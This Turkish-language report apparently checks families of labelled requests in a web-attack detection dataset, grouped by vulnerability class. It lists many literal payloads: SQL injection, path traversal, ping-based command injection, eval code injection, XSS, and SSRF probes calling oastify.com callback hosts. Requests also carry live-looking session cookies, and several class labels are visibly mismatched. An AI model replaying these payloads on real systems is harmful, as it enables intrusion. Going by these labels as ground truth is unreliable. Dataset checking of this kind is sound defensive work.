# Aile doğrulaması — ds_aug_v2, eşik 0.8

Her sınıftan en az 5 üyeli rastgele aileler; her aileden 3 rastgele üye. 'Yüzey' = tamamen çözülmüş saldırı yüzeyi (method+URI, standart dışı header'lar, body).

## 000 - Normal

Sınıfta 15839 aile; ≥5 üyeli: 1252.

### Aile `5413` — 8 üye · en yaygın yol payı 25% · farklı yüzey oranı 88%

- `GET /blog" / sleep(15) / "/index.php/search/feed/rss2`
- `GET /blog" / sleep(15) / "/index.php/search/feed/feed/rss2`
- `GET /blog" / sleep(15) / "/index.php/sample-page`

### Aile `54211` — 11 üye · en yaygın yol payı 18% · farklı yüzey oranı 91%

- `GET /blog/wp-includes/js/media-models.min.js?ver=4.9.5 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; comme …`
- `GET /blog/wp-includes/js/wp-embed.min.js?ver=4.9.5 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; comment_a …`
- `GET /blog/wp-includes/js/wp-embed.min.js?ver=4.9.5 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b= …`

### Aile `72642` — 6 üye · en yaygın yol payı 33% · farklı yüzey oranı 100%

- `OPTIONS /blog/index.php/2020/04/04/labore-pariatur-amet-quam/embed/ ⏎ cookie: Wl8U8ZRrM2C0yqx=0nA3foMplaWwjbuHvv97xPYkvo2mD1jieXKvLh0x; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde7978 …`
- `OPTIONS /blog/index.php/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/embed/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd862 …`
- `OPTIONS /blog/index.php/2020/04/04/vero-nihil-nam-numquam-ullam-quas/embed/ ⏎ cookie: 6TjBRKnMQWNtbhg=fUDIKV3lUWQbS99ZwIvoYgAsjnx3TLYxQpiivgOh; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|b …`

## 126 - Path Traversal

Sınıfta 1114 aile; ≥5 üyeli: 218.

### Aile `114` — 6 üye · en yaygın yol payı 33% · farklı yüzey oranı 67%

- `GET /../../../../../../../../../../../../../../../..//index.php/author/vbechtelar`
- `GET //../../../../../../../../../../../../../../../..//index.php/author/vbechtelar/feed`
- `GET //../../../../../../../../../../../../../../../..//index.php/author/vbechtelar`

### Aile `18557` — 9 üye · en yaygın yol payı 11% · farklı yüzey oranı 100%

- `GET /blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed/.git/index`
- `GET /blog/index.php/2020/04/04/consequatur-ad-error-quidem/feed/.git/index`
- `GET /blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed/.git/index`

### Aile `81828` — 35 üye · en yaygın yol payı 3% · farklı yüzey oranı 100%

- `GET //../../../../../../../../../../../../../../../..//index.php/2020/04/04/labore-pariatur-amet-quam/feed`
- `GET /../../../../../../../../../../../../../../../..//index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed`
- `GET //../../../../../../../../../../../../../../../..//index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed`

## 1336 - SSTI

Sınıfta 77 aile; ≥5 üyeli: 15.

### Aile `88386` — 711 üye · en yaygın yol payı 56% · farklı yüzey oranı 14%

- `GET /v3/signin/identifier ⏎ referer: https://login.yahoo.com/ ⏎ cookie: __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_b4unzHcq3Auq3; __Secure-ROLLOUT_TOKEN=CNz3spLg7sDidxCX8sP8qZuOAxjcltD8qZuOAw==; ST-14k9s8n=csn=RLcwqlbkq9gnEQfk&endpoint={"clickTrackingPara …`
- `GET /v3/signin/identifier ⏎ referer: https://login.yahoo.com/ ⏎ cookie: __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_b4unzHcq3Auq3; __Secure-ROLLOUT_TOKEN=CNz3spLg7sDidxCX8sP8qZuOAxjcltD8qZuOAw==; ST-14k9s8n=csn=RLcwqlbkq9gnEQfk&endpoint={"clickTrackingPara …`
- `GET /v3/signin/identifier ⏎ referer: https://login.yahoo.com/ ⏎ cookie: __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_b4unzHcq3Auq3; __Secure-ROLLOUT_TOKEN=CNz3spLg7sDidxCX8sP8qZuOAxjcltD8qZuOAw==; ST-14k9s8n=csn=RLcwqlbkq9gnEQfk&endpoint={"clickTrackingPara …`

### Aile `88854` — 6 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /log ⏎ cookie: NID=525=Z_luSUK5KR8Cn5Ue-Srhp1TtEv4Joi-tDG5rgTPMkc0d2d-wrvFiz-7xEaYy1R_rCAy9tOYmJxiiTGpvN7cpq20DnCrQBII3y4u_869N_KQvF-6VhOdGKakEqhEr5OxT0jijDG8zwZ82KuiPFMTFvTGR0c2M5KkmkpOyRZOTRZojtM5LkSOFYkw-wpCYmS9lofdGEX4kWM2-ht8Ak2Vu3A5tJCKfoE-3xUDpfxxD …`
- `POST /log ⏎ cookie: NID=525=Z_luSUK5KR8Cn5Ue-Srhp1TtEv4Joi-tDG5rgTPMkc0d2d-wrvFiz-7xEaYy1R_rCAy9tOYmJxiiTGpvN7cpq20DnCrQBII3y4u_869N_KQvF-6VhOdGKakEqhEr5OxT0jijDG8zwZ82KuiPFMTFvTGR0c2M5KkmkpOyRZOTRZojtM5LkSOFYkw-wpCYmS9lofdGEX4kWM2-ht8Ak2Vu3A5tJCKfoE-3xUDpfxxD …`
- `POST /log ⏎ cookie: NID=525=Z_luSUK5KR8Cn5Ue-Srhp1TtEv4Joi-tDG5rgTPMkc0d2d-wrvFiz-7xEaYy1R_rCAy9tOYmJxiiTGpvN7cpq20DnCrQBII3y4u_869N_KQvF-6VhOdGKakEqhEr5OxT0jijDG8zwZ82KuiPFMTFvTGR0c2M5KkmkpOyRZOTRZojtM5LkSOFYkw-wpCYmS9lofdGEX4kWM2-ht8Ak2Vu3A5tJCKfoE-3xUDpfxxD …`

### Aile `88384` — 99 üye · en yaygın yol payı 57% · farklı yüzey oranı 29%

- `GET /signin/oauthjg7cf%>vmn3r'/"<diq2s/consent ⏎ referer: https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=860033281504.apps.googleusercontent.com&response_type=code&redirect_uri=https://login.yahoo.com/account/challenge/tpa/redirect&s …`
- `GET /signin/oauth/consent ⏎ referer: https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=860033281504.apps.googleusercontent.com&response_type=code&redirect_uri=https://login.yahoo.com/account/challenge/tpa/redirect&scope=openid email pro …`
- `GET /signin/oauth/consent ⏎ referer: https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=860033281504.apps.googleusercontent.com&response_type=code&redirect_uri=https://login.yahoo.com/account/challenge/tpa/redirect&scope=openid email pro …`

## 248 - Command Injection

Sınıfta 80 aile; ≥5 üyeli: 16.

### Aile `88558` — 12 üye · en yaygın yol payı 100% · farklı yüzey oranı 50%

- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/ ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HPSALOCALTEST1,seamless,dmi …`
- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/62698222' or 6619=6619-- ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HPS …`
- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/91237636' or '1563'='1563 ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HP …`

### Aile `68291` — 5 üye · en yaygın yol payı 20% · farklı yüzey oranı 100%

- `GET /g/chains/202402/aus.content-signature.mozilla.org-2025-08-09-00-37-13.chain45739562' or 2626=2626-- `
- `GET /g/chains/202402/aus.content-signature.mozilla.org-2025-08-09-00-37-13.chain51145832' or 1732=1733-- `
- `GET /g/chains/202402/aus.content-signature.mozilla.org-2025-08-09-00-37-13.chain84733270' or 6687=6687-- `

### Aile `79332` — 14 üye · en yaygın yol payı 7% · farklı yüzey oranı 100%

- `POST /submit/telemetry/fb662902-6091-459d-8a33-bb449cc7741d69445086' or 3665=3674-- /main/Firefox/139.0.4/release/20250609112858 ⏎ content-type: application/json; charset=UTF-8 ⏎ date: Mon, 23 Jun 2025 09:48:59 GMT ⏎ content-encoding: gzip`
- `POST /submit/telemetry/fb662902-6091-459d-8a33-bb449cc7741d/main31749383' or '9181'='9186/Firefox/139.0.4/release/20250609112858 ⏎ content-type: application/json; charset=UTF-8 ⏎ date: Mon, 23 Jun 2025 09:48:59 GMT ⏎ content-encoding: gzip`
- `POST /submit/telemetry/fb662902-6091-459d-8a33-bb449cc7741d/main/Firefox/139.0.4/release/2025060911285821649545' or 3373=3373--  ⏎ content-type: application/json; charset=UTF-8 ⏎ date: Mon, 23 Jun 2025 09:48:59 GMT ⏎ content-encoding: gzip`

## 66 - SQL Injection

Sınıfta 15760 aile; ≥5 üyeli: 529.

### Aile `156` — 29 üye · en yaygın yol payı 7% · farklı yüzey oranı 100%

- `GET /blog' and 0 in (select sleep(15) ) -- /index.php/wp-json/oembed/1.0/embed?format=xml&url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/`
- `GET /blog' or 0 in (select sleep(15) ) -- /index.php/wp-json/oembed/1.0/embed?format=xml&url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/`
- `GET /blog" where 0 in (select sleep(15) ) -- /index.php/wp-json/oembed/1.0/embed?url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/`

### Aile `109235` — 9 üye · en yaygın yol payı 11% · farklı yüzey oranı 100%

- `GET /blog/index.php/2020/03')) AND (SELECT 5334 FROM(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(5334=5334,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (('ywNY'='ywNY/27/qui-ratione-maxime-dolores-consequat …`
- `GET /blog/index.php/2020' AND ROW(5342,3426)>(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(5342=5342,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM (SELECT 3013 UNION SELECT 4502 UNION SELECT 3640 UNION SELECT 2445)a GROUP BY x) AND 'WxNy' LIKE 'WxNy/03/22/quid …`
- `GET /blog/index.php') RLIKE (SELECT * FROM (SELECT(SLEEP(5)))PAWG) AND ('JTNy'='JTNy/2020/03/29 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; com …`

### Aile `103876` — 7 üye · en yaygın yol payı 14% · farklı yüzey oranı 100%

- `GET /blog/index.php/2020) AND (SELECT * FROM (SELECT(SLEEP(5)))AYDQ) AND (5858=5858/03/22/quidem-rerum-sit-doloribus-quia-eum ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da …`
- `GET /blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed;(SELECT * FROM (SELECT(SLEEP(5)))cbJa)# ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo- …`
- `GET /blog/index.php";(SELECT * FROM (SELECT(SLEEP(5)))vLyU)#/2020/03/27 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76ed …`

## 79 - Cross-Site Scripting

Sınıfta 70 aile; ≥5 üyeli: 17.

### Aile `88376` — 66 üye · en yaygın yol payı 6% · farklı yüzey oranı 70%

- `GET / alert(1)/content/article/ ⏎ referer: https://www.yahoo.com/lifestyle/articles/golden-retriever-accidentally-teaches-dog-071739474.html ⏎ cookie: GUCS=AS21Adb3; cmp=t=1750672068&j=0&u=1---; gpp=DBAA; gpp_sid=-1; axids=dv360=eS13RVdPVVpKRTJ1RlR1dy5xQmRYV01 …`
- `GET /news/weather/forecast/1521894document.location=1 ⏎ referer: https://www.yahoo.com/lifestyle/articles/golden-retriever-accidentally-teaches-dog-071739474.html ⏎ cookie: GUCS=AS21Adb3; cmp=t=1750672068&j=0&u=1---; gpp=DBAA; gpp_sid=-1; axids=dv360=eS13RVdPV …`
- `GET / alert(1) ⏎ service-worker: script ⏎ cookie: GUCS=AS21Adb3; cmp=t=1750672068&j=0&u=1---; gpp=DBAA; gpp_sid=-1; axids=dv360=eS13RVdPVVpKRTJ1RlR1dy5xQmRYV01fd21iaWc4TnFLdn5B&gam=y-WA7HMt9E2uJEKJ8gTyA0f9nAsgWZERQE~A&ydsp=y-u.kUPy5E2uIa9xWWXcCRSIJwFvKSSupH~A& …`

### Aile `88558` — 7 üye · en yaygın yol payı 100% · farklı yüzey oranı 43%

- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/ ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HPSALOCALTEST1,seamless,dmi …`
- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/ ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HPSALOCALTEST1,seamless,dmi …`
- `GET /openrtb2/auction ⏎ referer: https://www.yahoo.com/ ⏎ {"imp": [{"ext":{"prebid":{"passthrough":{"bucket":"prebid-hnel-ibvbb-ctrl,left-rail-creators-follow-on,TNAWSTEST,prebid-bidderconfig-unrulyhv-ctrl,creators-fauxdal-follow-on,HPSALOCALTEST1,seamless,dmi …`

### Aile `69938` — 19 üye · en yaygın yol payı 26% · farklı yüzey oranı 79%

- `GET /ups/58784alert(1)/sync ⏎ cookie: A1=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A1S=d=AQABBA8iWWgCENZh5v …`
- `GET /ups/58824/alert(1) ⏎ cookie: A3=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; IDSYNC=19ac~2pwx:19aj~2pwx:19bn~2pwx:19bu~2pwx:19cu~2pwx:19cw~2pwx:19e0~2pwx:19e7~2pwx:19ea~2pwx; A1=d=AQABBA8iWWgCENZh5vbzGI8S …`
- `GET / ⏎ cookie: A1=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEB …`

## 88 - OS Command Injection

Sınıfta 1503 aile; ≥5 üyeli: 208.

### Aile `234017` — 5 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /vap/ew/componentbuilder ⏎ cookie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z s-T1QAMEVV45Z00C7C58T4|1750598511921&t:1750598511921&adb:adblk_no; session-id=146-3458278-9350247; session-id-time=2082787201l; i18n-prefs=USD; lc-main=en_US; sp-cdn="L5Z9:EG" …`
- `POST /vap/ew/componentbuilder ⏎ x-requested-with: XMLHttpRequest ⏎ content-type: application/json;charset=UTF-8 ⏎ referer: 'z'z"${{%{{\ ⏎ {"requester": "VSEWidgetCards","clientPrefix":"detail","page":"Detail","placement":"VWDPCard-Desktop","device":"Desktop"," …`
- `POST /vap/ew/componentbuilder ⏎ cookie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z s-T1QAMEVV45Z00C7C58T4|1750598511921&t:1750598511921&adb:adblk_no; session-id=146-3458278-9350247; session-id-time=2082787201l; i18n-prefs=USD; lc-main=en_US; sp-cdn="L5Z9:EG" …`

### Aile `5035` — 16 üye · en yaygın yol payı 75% · farklı yüzey oranı 69%

- `GET /ads/CE7D6K3E.json|ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #' |ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #\" |ping -n 21 127.0.0.1 ⏎ referer: https://reqres.in/ ⏎ x-origin: https://reqres.in/ ⏎ x-client: carbon.js/20231113 (serveUrl:CE7D6K3E;serve: …`
- `GET /ads/CE7D6K3E.json ⏎ referer: https://reqres.in/ ⏎ x-origin: https://reqres.in/ ⏎ x-client: carbon.js/20231113 (serveUrl:CE7D6K3E;serve:CE7D6K3E)`
- `GET /ads/CE7D6K3E.json ⏎ referer: https://reqres.in/ ⏎ x-origin: https://reqres.in/ ⏎ x-client: carbon.js/20231113 (serveUrl:CE7D6K3E;serve:CE7D6K3E)`

### Aile `27` — 10 üye · en yaygın yol payı 10% · farklı yüzey oranı 100%

- `GET /cdn-cgi/challenge-platform/h/g|ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #' |ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #\" |ping -n 21 127.0.0.1/scripts/jsd/180b6a431d85/main.js ⏎ cookie: uid=dd3560c0c218; sid=1:2ByBFztqIHWeLY662oHFmhp Cxfm2DpBqD/6O …`
- `GET /cdn-cgi/challenge-platform/h/g/scripts/jsd/180b6a431d85/main.js|ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #' |ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #\" |ping -n 21 127.0.0.1 ⏎ cookie: uid=dd3560c0c218; sid=1:2ByBFztqIHWeLY662oHFmhp Cxfm2DpBqD/6O …`
- `GET /cdn-cgi/challenge-platform|ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #' |ping -n 21 127.0.0.1||'ping -c 21 127.0.0.1' #\" |ping -n 21 127.0.0.1/h/g/scripts/jsd/180b6a431d85/main.js ⏎ cookie: uid=dd3560c0c218; sid=1:2ByBFztqIHWeLY662oHFmhp Cxfm2DpBqD/6O …`

## 918 - SSRF

Sınıfta 155 aile; ≥5 üyeli: 24.

### Aile `81702` — 10 üye · en yaygın yol payı 20% · farklı yüzey oranı 100%

- `GET /s/player/e12fbea4/player_ias.vflset/en_GB/remote.js ⏎ cookie: VISITOR_INFO1_LIVE=wmBq4wRzCY0; VISITOR_PRIVACY_METADATA=CgJFRxIEGgAgLA==; __Secure-3PSIDCC=AKEyXzW5V7fWaYBcSi4scALvtOOSatrTpkGea_K0oqWjZn0z2nCSCxP2JNfGfYl3JHdIWb3I; HSID=AH8BSZ2RIcb7aY4yb; SSI …`
- `GET /s/search/audio/success.mp3 ⏎ cookie: YSC=AqIjuf7527o; __Secure-ROLLOUT_TOKEN=CJGQtdjr5MyBngEQlt3egpaHjgMYkPTO9paHjgM=; VISITOR_INFO1_LIVE=3nkeUUkVNmw; VISITOR_PRIVACY_METADATA=CgJFRxIEGgAgRw==; GPS=1; PREF=f6=40000000&tz=Africa.Cairo&f7=100; __Secure-ROLL …`
- `GET /s/player/e12fbea4/player_ias.vflset/en_GB/embed.js ⏎ cookie: VISITOR_INFO1_LIVE=wmBq4wRzCY0; VISITOR_PRIVACY_METADATA=CgJFRxIEGgAgLA==; __Secure-3PSIDCC=AKEyXzW5V7fWaYBcSi4scALvtOOSatrTpkGea_K0oqWjZn0z2nCSCxP2JNfGfYl3JHdIWb3I; HSID=AH8BSZ2RIcb7aY4yb; SSID …`

### Aile `0` — 10 üye · en yaygın yol payı 10% · farklı yüzey oranı 100%

- `GET /js/https://9dnupaoys281u2e8pvhkjx53cuio6o8cz0qsdi17.oastify.com/?app.js ⏎ referer: https://reqres.in/ ⏎ cookie: _ga=GA1.2.907635732.1750671325; _gid=GA1.2.1050846109.1750671325; _ga_CESXN06JTW=GS2.1.s1750671325$o1$g1$t1750671458$j60$l0$h0; _ga_WSM10MMEKC= …`
- `DELETE /api/users/http://4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.oastify.com/?2 ⏎ x-api-key: reqres-free-v1 ⏎ referer: https://reqres.in/ ⏎ cookie: _ga=GA1.2.907635732.1750671325; _gid=GA1.2.1050846109.1750671325; _ga_CESXN06JTW=GS2.1.s1750671325$o1$g1$t17506 …`
- `GET /api/users/<mme xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://oa29mpldph5grhbnmaezgc2i99f334zs0gr8ey2n.oastify.com/foo"/></mme> ⏎ x-api-key: reqres-free-v1 ⏎ referer: https://reqres.in/ ⏎ cookie: _ga=GA1.2.907635732.1750671325; _gid=G …`

### Aile `5315` — 6 üye · en yaygın yol payı 17% · farklı yüzey oranı 100%

- `GET /assets/http://0uvl615p9tpsbtvz6myb0omutlzfn6i46uulm8cw1.oastify.com/?chunk.705.3247db7e0cd66da5bcbd.js ⏎ referer: https://apps.apple.com/us/app/khan-academy/id469863705 ⏎ cookie: geo=EG; itcCt=pt=698519&ct=website footer&cid=469863705`
- `GET /assets/mwm78n7bbfredfxl880x2aogv711pskw8owfo2eq3.oastify.com ⏎ cookie: itcCt=pt=698519&ct=website footer&cid=469863705; geo=EG ⏎ referer: https://apps.apple.com/us/app/khan-academy/id469863705`
- `GET /assets/chunk.705.3247db7e0cd66da5bcbd.js ⏎ cookie: itcCt=pt=698519&ct=<ebj xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://q3ubfrefijyikj4pfc719evk2b85wwr0f13zwmm9dx2.oastify.com/foo"/></ebj>&cid=469863705; geo=EG ⏎ referer: https://ap …`

## 94 - Code Injection

Sınıfta 120 aile; ≥5 üyeli: 22.

### Aile `83009` — 37 üye · en yaygın yol payı 22% · farklı yüzey oranı 78%

- `GET /AdServer/ImgSync ⏎ referer: https://am-match.taboola.com/{${sleep(20)}} ⏎ cookie: KTPCACOOKIE=YES; SyncRTB2=1752537600:220; ipc=156307^https://image4.pubmatic.com/AdServer/SPug?p=156307&mpc=4&fp=1&pmc=PM_PMC&pr=https://sync.taboola.com/sg/rtb-pubmatic-net …`
- `GET /pixel ⏎ referer: https://am-match.taboola.com/ ⏎ cookie: KTPCACOOKIE=YES; SyncRTB2=1752537600:220; ipc=156307^https://image4.pubmatic.com/AdServer/SPug?p=156307&mpc=4&fp=1&pmc=PM_PMC&pr=https://sync.taboola.com/sg/rtb-pubmatic-network/1/rtb-h?taboola_hm=# …`
- `GET /eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))/view ⏎ referer: https://9510693351646df5c769194ec30cfd04.safeframe.googlesyndication.com/ ⏎ cookie: test_cookie=CheckForPermission; IDE=AHWqTUk74eJE7n_LLuc7nTGz1_cPOHpRZK8IP6p …`

### Aile `74704` — 15 üye · en yaygın yol payı 87% · farklı yüzey oranı 100%

- `POST /ajax/bulk-route-definitions/ ⏎ cookie: datr=yfNjaLCjxG80Bh8sBi2H2cqM; ps_l=0; ps_n=0; wd=1920x955; sb=yfNjaATES6TDjfwTzRQme7Sp; dpr=1.25; c_user=61577710559841; presence=C{"t3":[],"utc3":1750583101545,"v":1}; sfiu=AYga0GzbNMJrWHRto_D6eHFjUbp8ln1qrbCxP-Cl …`
- `POST /ajax/bulk-route-definitions/ ⏎ cookie: datr=yfNjaLCjxG80Bh8sBi2H2cqM; sb=yfNjaATES6TDjfwTzRQme7Sp; wd=1920x955; ps_l=0; ps_n=0; dpr=1.25; c_user=61577710559841; presence=C{"t3":[],"utc3":1750583101545,"v":1}; sfiu=AYga0GzbNMJrWHRto_D6eHFjUbp8ln1qrbCxP-Cl …`
- `POST /ajax/bulk-route-definitions/ ⏎ cookie: datr=yfNjaLCjxG80Bh8sBi2H2cqM; sb=yfNjaATES6TDjfwTzRQme7Sp; wd=1920x955; ps_l=0; ps_n=0; dpr=1.25; c_user=61577710559841; presence=C{"t3":[],"utc3":1750583101545,"v":1}; sfiu=AYga0GzbNMJrWHRto_D6eHFjUbp8ln1qrbCxP-Cl …`

### Aile `83014` — 18 üye · en yaygın yol payı 33% · farklı yüzey oranı 33%

- `GET /eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))/exp.json ⏎ referer: https://www.yahoo.com/news/weather/forecast/1521894 ⏎ cookie: A1=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb …`
- `GET /eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))/exp.json ⏎ referer: https://www.yahoo.com/news/weather/forecast/1521894 ⏎ cookie: A1=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb …`
- `GET /ybar/exp.json' (function(){if(typeof t65cq==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);t65cq=1;}}()) ' ⏎ referer: https://www.yahoo.com/news/weather/forecast/1521894 ⏎ cookie: A1=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhj …`

## Özet

| Sınıf | Aile boyutu | En yaygın yol payı | Farklı yüzey oranı |
|---|---:|---:|---:|
| 000 - Normal | 8 | 25% | 88% |
| 000 - Normal | 11 | 18% | 91% |
| 000 - Normal | 6 | 33% | 100% |
| 126 - Path Traversal | 6 | 33% | 67% |
| 126 - Path Traversal | 9 | 11% | 100% |
| 126 - Path Traversal | 35 | 3% | 100% |
| 1336 - SSTI | 711 | 56% | 14% |
| 1336 - SSTI | 6 | 100% | 100% |
| 1336 - SSTI | 99 | 57% | 29% |
| 248 - Command Injection | 12 | 100% | 50% |
| 248 - Command Injection | 5 | 20% | 100% |
| 248 - Command Injection | 14 | 7% | 100% |
| 66 - SQL Injection | 29 | 7% | 100% |
| 66 - SQL Injection | 9 | 11% | 100% |
| 66 - SQL Injection | 7 | 14% | 100% |
| 79 - Cross-Site Scripting | 66 | 6% | 70% |
| 79 - Cross-Site Scripting | 7 | 100% | 43% |
| 79 - Cross-Site Scripting | 19 | 26% | 79% |
| 88 - OS Command Injection | 5 | 100% | 100% |
| 88 - OS Command Injection | 16 | 75% | 69% |
| 88 - OS Command Injection | 10 | 10% | 100% |
| 918 - SSRF | 10 | 20% | 100% |
| 918 - SSRF | 10 | 10% | 100% |
| 918 - SSRF | 6 | 17% | 100% |
| 94 - Code Injection | 37 | 22% | 78% |
| 94 - Code Injection | 15 | 87% | 100% |
| 94 - Code Injection | 18 | 33% | 33% |
